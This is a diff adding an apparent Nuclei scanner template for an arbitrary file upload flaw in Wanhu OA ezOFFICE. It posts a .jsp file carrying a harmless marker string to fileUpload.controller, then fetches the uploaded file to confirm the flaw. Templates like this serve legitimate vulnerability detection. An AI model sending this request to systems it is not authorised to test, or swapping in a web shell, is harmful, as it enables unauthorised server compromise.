@@ -1,0 +1,58 @@
+id: poc-wanhu-ezoffice-fileupload-controller-upload
+info:
+  name: Wanhu OA ezOFFICE Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload
+  description: |
+    Wanhu OA ezOFFICE fileUpload.controller is vulnerable to arbitrary file upload, allowing attackers to upload malicious files to the server.
+
+variables:
+  filename: "{{rand_base(8)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/defaultroot/upload/fileUpload.controller"
+    headers:
+      Content-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+    body: |
+      --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+      Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+      Content-Type: application/octet-stream
+      Content-Transfer-Encoding: binary
+
+      This website has a vulnerability
+      --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"success\""
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: upload-filename
+        part: body
+        internal: true
+        regex:
+          - "\\\"data\\\":\\\"(?P<filename>.*?).jsp"
+        group: 1
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/upload/html/{{filename}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "This website has a vulnerability"
+      - type: status
+        status:
+          - 200
